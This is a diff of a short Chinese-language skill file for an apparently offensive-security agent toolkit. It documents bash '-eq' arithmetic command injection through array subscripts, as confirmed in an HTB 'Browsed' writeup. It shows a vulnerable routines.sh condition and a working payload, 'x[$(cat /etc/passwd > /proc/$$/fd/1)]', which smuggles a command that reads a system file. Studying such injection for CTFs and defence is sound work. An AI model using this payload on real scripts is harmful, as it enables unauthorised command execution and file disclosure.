@@ -4,19 +4,19 @@ description: 'bash [[ -eq ]] 数组下标命令注入：x[$(cmd)] 形式（Brows
 disable-model-invocation: true
 metadata: { domain: web, tier: T3 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
 
-# bash  -eq  数组下标注入（x[$(cmd)] 形式）
+
+# bash -eq 数组下标注入（x[$(cmd)] 形式）
 
 ## 技术（Browsed HTB writeup 确认）
 ```bash
 # 漏洞代码: routines.sh
 if  "$1" -eq 0 ; then ...
-```
+```text
 ` "$1" -eq 0 ` 中 `-eq` 强制算术求值。**payload 形式**：
-```
+```text
 $ ./routines.sh 'x[$(cat /etc/passwd > /proc/$$/fd/1)]'   # ← 命令执行！
-```
+```text
 - `x[...]` 解析为**数组 x 的下标** → 下标是算术表达式 → `$( )` 在算术求值中**执行**
 - 报错 "expression recursion level exceeded" 但命令**已执行**
 - **裸 `$(cmd)` / `0$(cmd)` 不执行**（arithmetic syntax error）——必须 `x[$(cmd)]` 形式
